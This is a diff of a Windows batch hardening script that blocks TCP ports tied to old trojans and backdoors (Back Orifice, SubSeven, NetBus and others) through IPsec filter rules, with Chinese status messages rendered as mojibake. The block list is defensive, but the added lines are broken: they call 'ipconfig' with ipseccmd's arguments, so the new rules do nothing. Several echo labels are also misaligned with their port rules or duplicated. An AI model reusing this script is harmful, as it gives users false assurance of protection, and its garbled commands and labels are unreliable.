-echo ¹Ø±ÕÄ¾ÂímsblastÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7308" -f *+0:7308:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitor 4.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6129" -f *+0:6129:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÔ¶³Ì¿ØÖÆÈí¼ş£¨dameware nt utilities)Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRipperÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíVooDoo DollÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíBO jammerkillahVÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/456" -f *+0:456:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíHackers ParadiseÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíStealth SpyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSatanz BackdoorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSilencerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetspyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7000" -f *+0:7000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemote GrabÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7300 " -f *+0:7300:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetMonitorÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíUgly FTPÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/23456 " -f *+0:23456:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíUgly FTPÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/30100 " -f *+0:30100:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíNetSphereÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPortal of DoomÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9899" -f *+0:9899:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíiNi-KillerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSockets de TroieÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/6939" -f *+0:6939:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíIndoctrinationÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíSenna SpyÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12223" -f *+0:12223:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíHack?99 KeyLoggerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/12362" -f *+0:12362:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWhack-a-mole 1.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMilleniumÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíWincrash v2Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRemote Windows ShutdownÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/7789" -f *+0:7789:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíICKillerÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíMasters Paradise 3.xÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíRoboHackÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/8000" -f *+0:8000:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíhuigeziÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9872" -f *+0:9872:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíPortal of DoomÄ¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2005" -f *+0:2005:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕÄ¾ÂíºÚ¶´2005Ä¬ÈÏ·şÎñ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
-echo ¹Ø±Õ²ÊºçÇÅ1.2Ä¬ÈÏ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -r "Block TCP/9999" -f *+0:9999:TCP -n BLOCK -x >nul
-echo ¹Ø±ÕhuigeziÓ³ÉäÄ¬ÈÏ¶Ë¿Ú¡­¡­¡­¡­OK!
-ipseccmd -w REG -p "HFUT_SECU" -x >nul
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31338" -f *+0:31338:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Back Orificeé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8102" -f *+0:8102:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œç¥å·é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2000" -f *+0:2000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬é»‘æ´2000é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31339" -f *+0:31339:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetSpy DKé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬é»‘æ´2001é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/31666" -f *+0:31666:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BOWhacké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BigGlucké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œç²¾çµ3.0ï¼Œnetspy3.0é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40412" -f *+0:40412:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬The Spyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40421" -f *+0:40421:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradiseé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/8011" -f *+0:8011:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬wryï¼Œèµ–å°å­ï¼Œç«å‡¤å‡°é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40422" -f *+0:40422:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradise 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23444" -f *+0:23444:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œå…¬ç‰›ï¼Œnetbullé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40423" -f *+0:40423:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradise 2.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/23445" -f *+0:23445:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ç½‘ç»œå…¬ç‰›ï¼Œnetbullé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/40426" -f *+0:40426:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradise 3.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50505" -f *+0:50505:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sockets de Troieé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/27374" -f *+0:27374:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sub Seven 2.0+ï¼Œ77ï¼Œä¸œæ–¹é­”çœ¼é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Foreé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/53001" -f *+0:53001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Remote Windows Shutdowné»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Telecommandoé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/121" -f *+0:121:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BO jammerkillahVé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Satanz Backdooré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Devilé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Silenceré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6400" -f *+0:6400:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬The tHingé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1600" -f *+0:1600:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Shivka-Burkaé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/12346" -f *+0:12346:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetBus 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1807" -f *+0:1807:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬SpySenderé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20034" -f *+0:20034:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetBus Proé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Shockraveé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1243" -f *+0:1243:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬SubSevené»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬WebExé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30100" -f *+0:30100:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetSphereé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1011" -f *+0:1011:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Doly Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1001" -f *+0:1001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Silenceré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Psyber Stream Serveré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/20000" -f *+0:20000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Milleniumé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1234" -f *+0:1234:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Ultors Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/65000" -f *+0:65000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Devil 1.03é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬VooDoo Dollé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/7306" -f *+0:7306:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬NetMonitoré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1492" -f *+0:1492:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬FTP99CMPé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1170" -f *+0:1170:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Streaming Audio Trojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1999" -f *+0:1999:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬BackDooré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30303" -f *+0:30303:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Socket23é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2001" -f *+0:2001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Trojan Cowé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6969" -f *+0:6969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Gatecrasheré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Ripperé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/61466" -f *+0:61466:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Telecommandoé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2115" -f *+0:2115:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Bugsé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/12076" -f *+0:12076:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Gjameré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Deep Throaté»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4950" -f *+0:4950:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬IcqTrojené»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2140" -f *+0:2140:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬The Invasoré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/16969" -f *+0:16969:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Priotrityé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2801" -f *+0:2801:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Phineas Phuckeré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1245" -f *+0:1245:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Vodooé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30129" -f *+0:30129:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Masters Paradiseé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5742" -f *+0:5742:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Wincrashé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/3700" -f *+0:3700:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Portal of Doomé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2583" -f *+0:2583:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Wincrash2é»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4092" -f *+0:4092:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬WinCrashé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1033" -f *+0:1033:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Netspyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/4590" -f *+0:4590:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ICQTrojané»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/1981" -f *+0:1981:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬ShockRaveé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5000" -f *+0:5000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sockets de Troieé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/555" -f *+0:555:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Stealth Spyé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5001" -f *+0:5001:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Sockets de Troie 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/2023" -f *+0:2023:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Pass Ripperé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5321" -f *+0:5321:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Firehotckeré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/666" -f *+0:666:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Attack FTPé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5400" -f *+0:5400:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runneré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/21554" -f *+0:21554:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬GirlFriendé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5401" -f *+0:5401:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runner 1.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/50766" -f *+0:50766:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Fore Schwindleré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5402" -f *+0:5402:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Blade Runner 2.xé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/34324" -f *+0:34324:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Tiny Telnet Serveré»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/5569" -f *+0:5569:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Robo-Hacké»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/30999" -f *+0:30999:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Kuangé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/6670" -f *+0:6670:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬DeepThroaté»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
+ipconfig -w REG -p "HFUT_SECU" -r "Block TCP/11000" -f *+0:11000:TCP -n BLOCK -x >nul
+echo å…³é—­æœ¨é©¬Senna Spy Trojansé»˜è®¤æœåŠ¡ç«¯å£â€¦â€¦â€¦â€¦OK!
